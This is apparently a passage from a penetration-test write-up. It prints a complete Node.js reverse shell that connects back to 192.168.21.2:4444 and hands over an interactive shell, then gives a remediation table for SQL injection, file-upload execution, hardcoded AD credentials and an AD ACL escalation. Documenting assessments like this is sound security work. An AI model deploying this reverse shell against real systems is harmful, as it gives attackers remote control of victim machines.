3. Phase 2: Reverse Shell & Credential Recovery

3.1 Node.js Reverse Shell Upload

We create a Node.js reverse shell payload (shell.js):

'use strict';
const net = require('net');
const { spawn } = require('child_process');

const CALLBACK_HOST = '192.168.21.2';
const CALLBACK_PORT = 4444;

const socket = net.createConnection({ host: CALLBACK_HOST, port: CALLBACK_PORT }, () => {
    const isWindows = process.platform === 'win32';
    const shell = isWindows ? 'cmd.exe' : '/bin/sh';
    const args = isWindows ? [] : ['-i'];
    const child = spawn(shell, args, { stdio: ['pipe', 'pipe', 'pipe'] });
    socket.pipe(child.stdin);
    child.stdout.pipe(socket);
    child.stderr.pipe(socket);
    child.on('close', () => socket.end());
});

6. Security Mitigations & Remediation

Vulnerability Impact Recommended Remediation
SQL Injection Authentication Bypass Unauthenticated administrative access to Node.js application. Use parameterized queries (prepared statements) or ORMs to prevent SQL injection.
Arbitrary File Upload / Execution Remote code execution via /preview/shell.js. Restrict upload file extensions, store uploads outside the web execution path, and do not execute uploaded scripts.
Hardcoded Credentials in Client APK Exposure of corporate Active Directory credentials. Never embed credentials in mobile binaries; use certificate-based or OAuth tokens.
Dangerous Active Directory ACL (AddMember) Unprivileged account can promote itself to Domain Administrator. Audit and restrict group management permissions. Standard domain users should never possess AddMember or WriteDacl rights on high-privilege groups.
